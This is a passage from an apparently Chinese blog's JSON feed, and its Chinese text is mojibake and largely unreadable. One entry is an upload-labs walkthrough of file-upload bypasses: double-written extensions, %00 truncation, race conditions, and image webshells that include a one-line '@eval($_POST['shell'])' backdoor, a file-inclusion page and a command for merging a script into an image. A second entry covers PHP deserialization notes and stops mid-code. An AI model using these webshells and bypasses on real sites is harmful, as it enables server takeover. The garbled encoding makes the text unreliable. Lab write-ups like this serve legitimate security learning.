å‡½æ•°å¯»æ‰¾æ–‡ä»¶åä¸­å­˜åœ¨çš„é»‘åå•å­—ç¬¦ä¸²ï¼Œå°†å®ƒæ›¿æ¢æˆç©ºï¼ˆå³å°†å®ƒåˆ æ‰ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡é»‘åå•</p>\n<blockquote>\n<p>è¡¥å……çŸ¥è¯†ï¼šstr_ireplace (find,replace,string,count) å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦<br>\nä¼  <code>zoe.php</code> Â ç„¶åç”¨ bp æ”¹åç¼€ä¸º <code>.pphphp</code>  ä½¿ç”¨èšå‰‘è¿æ¥ <code>zoe.php</code></p>\n</blockquote>\n<p>åäºŒ.get00 æˆªæ–­<br>\nè¿™ä¸€å…³ç™½åå•ï¼Œæœ€ç»ˆæ–‡ä»¶çš„å­˜æ”¾ä½ç½®æ˜¯ä»¥æ‹¼æ¥çš„æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨ %00 æˆªæ–­ï¼Œä½†éœ€è¦ <code>phpç‰ˆæœ¬&lt;5.3.4</code> ï¼Œå¹¶ä¸” <code>magic_quotes_gpc</code>  å…³é—­ã€‚<br>\nåŸç†ï¼šphp çš„ä¸€äº›å‡½æ•°çš„åº•å±‚æ˜¯ C è¯­è¨€ï¼Œè€Œ move_uploaded_file å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œé‡åˆ° 0x00 ä¼šæˆªæ–­ï¼Œ0x è¡¨ç¤º 16 è¿›åˆ¶ï¼ŒURL ä¸­ %00 è§£ç æˆ 16 è¿›åˆ¶å°±æ˜¯ 0x00ã€‚</p>\n<p>ä¸Šä¼  <code>zoe.php</code>  ç”¨ BP æŠ“åŒ…ä¿®æ”¹å‚æ•°ï¼ŒæŠŠ upload / åé¢åŠ ä¸Š <code>zoe.php%00</code> ï¼Œä¸‹é¢çš„ <code>filename=â€zoe.phpâ€</code>  æ”¹ä¸º <code>zoe.png</code> <br>\n ç”¨ antsword è¿æ¥æ—¶è¦åˆ æ‰åé¢çš„æ³¨é‡Š</p>\n<p>åä¸‰.post00 æˆªæ–­<br>\nè¿™ä¸€å…³ç™½åå•ï¼Œæ–‡ä»¶ä¸Šä¼ è·¯å¾„æ‹¼æ¥ç”Ÿæˆï¼Œè€Œä¸”ä½¿ç”¨äº† post å‘é€çš„æ•°æ®è¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ post æ•°æ®è¿›è¡Œ 0x00 æˆªæ–­ç»•è¿‡ç™½å<br>\nä¸€å¥è¯æœ¨é©¬æŠ“åŒ… zoe.php<br>\n åœ¨ <code>../upload/</code> Â è·¯å¾„ä¸‹åŠ ä¸Š <code>zoe.php+</code> Â  <code>+å·</code> æ˜¯ä¸ºäº†æ–¹ä¾¿åé¢ä¿®æ”¹ <code>Hex</code> <br>\n <code>+å·</code> çš„ Hex æ˜¯ <code>2b</code> ï¼Œè¿™é‡Œæˆ‘ä»¬è¦æŠŠå®ƒæ”¹ä¸º <code>00</code></p>\n<p>åå››ï¼šå›¾ç‰‡é©¬ unpack<br>\n å¯ä»¥å…ˆä¼ ä¸€ä¸ª 14.php (æ–‡ä»¶åŒ…å«) åˆ°æœåŠ¡å™¨ï¼Œå¯ä»¥é€‰æ‹©åˆ«çš„é¢˜ç›®ä¼ åˆ°æœåŠ¡å™¨ï¼Œ<mark> ç›®çš„æ˜¯è§£æä¼ å…¥çš„å›¾ç‰‡ä¸º PHP</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  include $file;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>å†ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œ14.jpg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>æ‰“å¼€ 14.php çš„è·¯å¾„ï¼Œurl è¾“å…¥ï¼Ÿfile = å›¾ç‰‡é©¬çš„è·¯å¾„</p>\n<p>è¡¥å……ï¼šå›¾ç‰‡é©¬åˆ¶ä½œ<br>\n<strong>åˆ¶ä½œå›¾ç‰‡é©¬å‘½ä»¤</strong>ï¼šcopy å›¾ç‰‡æ–‡ä»¶åç§° /b + è„šæœ¬æ–‡ä»¶åç§° /a  æ–°ç”Ÿæˆçš„æ–‡ä»¶åç§°ï¼Œä¾‹å¦‚ï¼šcopy 222.jpg/b+111.php/a 333.jpg<br>\n1. å…ˆå†™ jpg æ–‡ä»¶:<br>\nGIF89a<br>\n?&lt;php<br>\n@eval($_POST[â€˜shellâ€™]);<br>\n?&gt;<br>\n2. å†å†™ php æ–‡ä»¶<br>\nç›´æ¥å¤åˆ¶ç²˜è´´ç»™æˆ‘æ–‡ä»¶åŒ…å«<br>\n 3. åˆ¶ä½œå›¾ç‰‡é©¬<br>\n cmd å‘½ä»¤ï¼š13.jpg/b+13.php/a pass13.jpg<br>\n ä¹‹é—´ä¸Šä¼  pass13.jpg å°†å›¾ç‰‡åœ°å€ç»™ antsword è¿æ¥</p>\n<h1 id=\"åäº”getimagesizeå›¾ç‰‡é©¬\"><a class=\"markdownIt-Anchor\" href=\"#åäº”getimagesizeå›¾ç‰‡é©¬\">#</a> åäº” getimagesize å›¾ç‰‡é©¬</h1>\n<p>ä¸ä¸Šä¸€é¢˜ä¸€æ ·<br>\nè¡¥å……:getimagesize () å‡½æ•°çš„ä½œç”¨æ˜¯è·å–å›¾ç‰‡æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯</p>\n<p>åå…­ã€‚è·Ÿ 14,15 ä¸€æ ·ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«å’Œå›¾ç‰‡é©¬ getshell</p>\n<p>åä¸ƒã€‚äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</p>\n<p>ä¸Šä¼ æ­£å¸¸çš„ <code>GIF</code>  å›¾ç‰‡ä¸‹è½½å›æ˜¾çš„å›¾ç‰‡ï¼Œç”¨ notepad++ ç¼–è¾‘å™¨è¿›è¡Œå¯¹æ¯”ä¸¤ä¸ª GIF å›¾ç‰‡å†…å®¹ï¼Œæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œéœ€è¦ python è„šæœ¬å®ç°</p>\n<p>åå…«ã€‚æ¡ä»¶ç«äº‰<br>\nçœ‹ä»£ç ï¼Œå®ƒæ˜¯å…ˆæŠŠå›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œæ‰å¼€å§‹è¿›è¡Œåˆ¤æ–­åç¼€åã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸Šä¼ ä¸Šå»çš„ä¸€ç¬é—´è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä»–å°±ä¸èƒ½å¯¹è¿™ä¸ªæ–‡ä»¶åˆ é™¤ï¼ŒäºŒæ¬¡æ¸²æŸ“ç­‰ç­‰ã€‚å°±ç›¸å½“äºæˆ‘ä»¬æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†å»åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæç¤ºè¿™ä¸ªæ–‡ä»¶åœ¨å¦ä¸€ç¨‹åºå·²ç»æ‰“å¼€æ— æ³•åˆ é™¤<br>\nç”¨ burp æŠ“åŒ… -&gt; å¯¼å…¥åˆ° intruder æ¨¡å— -&gt; è®¾ç½®ç±»å‹ä¸º null payloads,payload options è®¾ç½®ä¸º conntinue indefinitely-&gt; åœ¨å¦ä¸€æµè§ˆå™¨æ‰“å¼€ä¸Šä¼ æ–‡ä»¶ä½ç½®</p>\n<p>åä¹ã€‚æ“ä½œä¸ä¸Šä¸€å…³å·®ä¸å¤šï¼Œé…åˆåŒ…å«æ¼æ´</p>\n<p>äºŒå.move_upload_file çš„æ¼æ´ï¼Œä¼šå¿½ç•¥ /.<br>\n1. åŠ  /.<br>\n2.save_name ç”¨ %00 é˜¶æ®µ (PHP ç‰ˆæœ¬å°äº 5.3)</p>\n<p>äºŒåä¸€<br>\næ•°ç»„éªŒè¯</p>\n<p>å¤§ä½¬çš„å›¾ç‰‡ https://wwe.lanzoui.com/iFSwwn53jaf<br>\n æ„é€ çš„ URL ä¸º <code>include.php?file=upload/31608.gif</code></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "url": "https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
            "title": "phpååºåˆ—åŒ–æ¼æ´å­¦ä¹ ",
            "date_published": "2023-04-27T08:33:14.709Z",
            "content_html": "<h2 id=\"1è®¿é—®æ§åˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#1è®¿é—®æ§åˆ¶\">#</a> (1). è®¿é—®æ§åˆ¶</h2>\n<h3 id=\"1public\"><a class=\"markdownIt-Anchor\" href=\"#1public\">#</a> 1.public</h3>\n<p>å…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®<br>\nåºåˆ—åŒ–åå˜æˆ <code>å±æ€§å</code></p>\n<h3 id=\"2protected\"><a class=\"markdownIt-Anchor\" href=\"#2protected\">#</a> 2.protected</h3>\n<p>å—ä¿æŠ¤çš„ç±»æˆå‘˜å¯ä»¥è¢«å…¶æœ¬èº«ä»¥åŠå­ç±»å’Œå­ç±»è®¿é—®<br>\nåºåˆ—å·åå˜æˆ <code>\\x00*\\x00å±æ€§å</code></p>\n<h3 id=\"3private\"><a class=\"markdownIt-Anchor\" href=\"#3private\">#</a> 3.private</h3>\n<p>ç§æœ‰çš„ 1 ç±»æˆå‘˜åªèƒ½è¢«å…¶å®šä¹‰çš„æ‰€åœ¨ç±»è®¿é—®<br>\nåºåˆ—åŒ–åå˜æˆ <code>\\x00ç±»å\\x00å±æ€§å</code> <br>\nå…¶ä¸­ <code>\\x00</code>  è¡¨ç¤ºç©ºå­—ç¬¦ï¼Œä½†è¿˜æ˜¯å ç”¨ä¸€ä¸ªå­—ç¬¦ä½ç½® (ç©ºæ ¼)<br>\n æ¥çœ‹ä¸ªä¾‹å­å­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">People</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">protected</span> <span class=\"variable\">$gender</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">private</span> <span class=\"variable\">$age</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"string\">&#x27;lxy&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;gender=<span class=\"string\">&#x27;male&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"variable language_\">$this</span>-&gt;age=<span class=\"string\">&#x27;23&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">People</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºç»“æœä¸º:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot; * gender&quot;;s:4:&quot;male&quot;;s:11:&quot; People age&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p><mark>æ³¨æ„</mark></p>\n<ol>\n<li>å¦‚æœæ˜¯ print_r (), æˆ–è€… echo çš„è¯ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°ç©ºæ ¼çš„ ( <code>\\x00</code> ), æ‰€ä»¥çœ‹åˆ°çš„ç»“æœæ˜¯</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>å¦‚æœè¾“å‡ºè¯­å¥æ˜¯ var_dump () çš„è¯ï¼Œçœ‹åˆ°çš„ç»“æœæ˜¯è¿™æ ·</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(93) &quot;O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;\\000*\\000gender&quot;;s:4:&quot;male&quot;;s:11:&quot;\\000People\\000age&quot;;s:2:&quot;23&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>\n<p>å¯¹æ¯”å¯ä»¥å‘ç° var_dump å¯ä»¥å‘ç°è¿™ä¸ªç©ºæ ¼å“¦</p>\n<h2 id=\"2åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#2åºåˆ—åŒ–ä¸ååºåˆ—åŒ–\">#</a> (2). åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2>\n<h3 id=\"1åºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#1åºåˆ—åŒ–\">#</a> 1. åºåˆ—åŒ–</h3>\n<p>æŠŠå¯¹è±¡ä¿¡æ¯è½¬æ¢æˆäºŒè¿›åˆ¶ä¸²ï¼Œserialize () å‡½æ•°</p>\n<h3 id=\"2ååºåˆ—åŒ–\"><a class=\"markdownIt-Anchor\" href=\"#2ååºåˆ—åŒ–\">#</a> 2. ååºåˆ—åŒ–</h3>\n<p>æŠŠè½¬åŒ–çš„äºŒè¿›åˆ¶ä¸²è½¬æ¢ä¸ºå¯¹è±¡ï¼Œunserialize () å‡½æ•°</p>\n<h3 id=\"3åºåˆ—åŒ–æ ¼å¼\"><a class=\"markdownIt-Anchor\" href=\"#3åºåˆ—åŒ–æ ¼å¼\">#</a> 3. åºåˆ—åŒ–æ ¼å¼</h3>\n<h4 id=\"31å¤´éƒ¨ä¿¡æ¯\"><a class=\"markdownIt-Anchor\" href=\"#31å¤´éƒ¨ä¿¡æ¯\">#</a> 3.1 å¤´éƒ¨ä¿¡æ¯</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:æ•°ç»„,array</span><br><span class=\"line\">b:å¸ƒå°”å‹,Boolean</span><br><span class=\"line\">d:æµ®ç‚¹å‹,double</span><br><span class=\"line\">i:æ•´æ•°å‹,integer</span><br><span class=\"line\">O:ç±»,class</span><br><span class=\"line\">N:ç©º,null</span><br><span class=\"line\">s:å­—ç¬¦ä¸²,string</span><br></pre></td></tr></table></figure>\n<h4 id=\"32-æ ¼å¼\"><a class=\"markdownIt-Anchor\" href=\"#32-æ ¼å¼\">#</a> 3.2 æ ¼å¼</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å¯¹è±¡ç±»å‹:é•¿åº¦:&quot;ç±»å&quot;:ç±»ä¸­å˜é‡çš„ä¸ªæ•°:&#123;ç±»å‹:é•¿åº¦:&quot;å€¼&quot;;ç±»å‹:é•¿åº¦:&quot;å€¼&quot;;....&#125;</span><br><span class=\"line\">eg</span><br><span class=\"line\">O:6:&quot;People&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lxy&quot;;s:9:&quot;*gender&quot;;s:4:&quot;male&quot;;s:11:&quot;Peopleage&quot;;s:2:&quot;23&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"33æ³¨æ„\"><a class=\"markdownIt-Anchor\" href=\"#33æ³¨æ„\">#</a> 3.3 æ³¨æ„</h4>\n<ol>\n<li>åºåˆ—åŒ–åªèƒ½åºåˆ—æˆå‘˜ (ä¹Ÿå°±æ˜¯ç±»é‡Œçš„å˜é‡), ä¸èƒ½åºåˆ—æ–¹æ³•</li>\n<li>å› ä¸ºåºåˆ—åŒ–ä¸åºåˆ—æ–¹æ³•ï¼Œæ‰€ä»¥ååºåˆ—åŒ–ä¹‹åå¦‚æœæƒ³æ­£å¸¸ä½¿ç”¨è¿™ä¸ªå¯¹è±¡çš„è¯è¦ä¾æ‰˜è¿™ä¸ªç±»å½“å‰ä½œç”¨åŸŸå­˜åœ¨çš„æ¡ä»¶</li>\n<li>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯é€šå…³ç²¾å¿ƒæ„é€ èƒ½è¢«æ§åˆ¶çš„ç±»çš„å±æ€§ï¼Œåˆ©ç”¨ä½œç”¨åŸŸæœ¬èº«å­˜åœ¨çš„æ–¹æ³•å‘åŠ¨æ”»å‡»</li>\n</ol>\n<h3 id=\"4é­”æœ¯æ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#4é­”æœ¯æ–¹æ³•\">#</a> 4. é­”æœ¯æ–¹æ³•</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct()            //ç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºå¯¹è±¡æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__destruct()             //ç±»çš„ææ„å‡½æ•°ï¼Œå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__call($a,$b)                 //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘,protectedå’Œprivateéƒ½ä¼šè°ƒç”¨</span><br><span class=\"line\">$aå­˜å‚¨æ‰€è°ƒç”¨çš„å‡½æ•°å,$bä»¥æ•°ç»„æ–¹å¼æ¥æ”¶å¤šä¸ªå‚æ•°</span><br><span class=\"line\">__callStatic($a,$b)           //åŒ__call($a,$b)</span><br><span class=\"line\"></span><br><span class=\"line\">__get()                  //è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œè¿™é‡Œçš„ä¸å¯è®¿é—®åŒ…å«ç§æœ‰å±æ€§æˆ–æœªå®šä¹‰,private</span><br><span class=\"line\"></span><br><span class=\"line\">__set()                  //åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__isset()                //å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__unset()                //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__invoke()               //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘</span><br><span class=\"line\"></span><br><span class=\"line\">__sleep()                //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•</span><br><span class=\"line\"></span><br><span class=\"line\">__wakeup()               //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•</span><br><span class=\"line\"></span><br><span class=\"line\">__toString()             //å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºåœ¨æ¨¡æ¿ä¸­çš„æ—¶å€™ï¼ˆè½¬æ¢æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼‰è‡ªåŠ¨è°ƒç”¨</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><mark>æ³¨æ„:</mark></p>\n<ol>\n<li>serialize () å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</li>\n<li>toString è¢«è°ƒç”¨çš„æƒ…å†µ</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  echo($obj)/print($obj)æ‰“å°æ—¶ä¼šè§¦å‘ </span><br><span class=\"line\">2.  ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ </span><br><span class=\"line\">3.  ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ </span><br><span class=\"line\">4.  ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ </span><br><span class=\"line\">5.  ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ </span><br><span class=\"line\">6.  ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œå¦‚strlen()ã€strops()ã€strcmp()ã€addslashes()ç­‰ </span><br><span class=\"line\">7.  åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ—¶ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰__toString()è¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™__toString()ä¼šè¢«è°ƒç”¨ </span><br><span class=\"line\">8.  ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸ºclass_exists()çš„å‚æ•°çš„æ—¶å€™ </span><br></pre></td></tr></table></figure>\n<h3 id=\"5ä¾‹å­\"><a class=\"markdownIt-Anchor\" href=\"#5ä¾‹å­\">#</a> 5. ä¾‹å­</h3>\n<p>çœ‹å‡ ä¸ªä¾‹å­æ·±åˆ»ç†è§£ä¸€ä¸‹åºåˆ—åŒ–å’Œååºåˆ—åŒ–å­</p>\n<h4 id=\"51\"><a class=\"markdownIt-Anchor\" href=\"#51\">#</a> 5.1</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$variable</span> = <span class=\"string\">&#x27;å˜é‡ååºåˆ—åŒ–åéƒ½è¦é”€æ¯&#x27;</span>; <span class=\"comment\">//å…¬å…±å˜é‡</span></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"variable\">$variable2</span> = <span class=\"string\">&#x27;OTHER&#x27;</span>;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printvariable</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;variable.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span 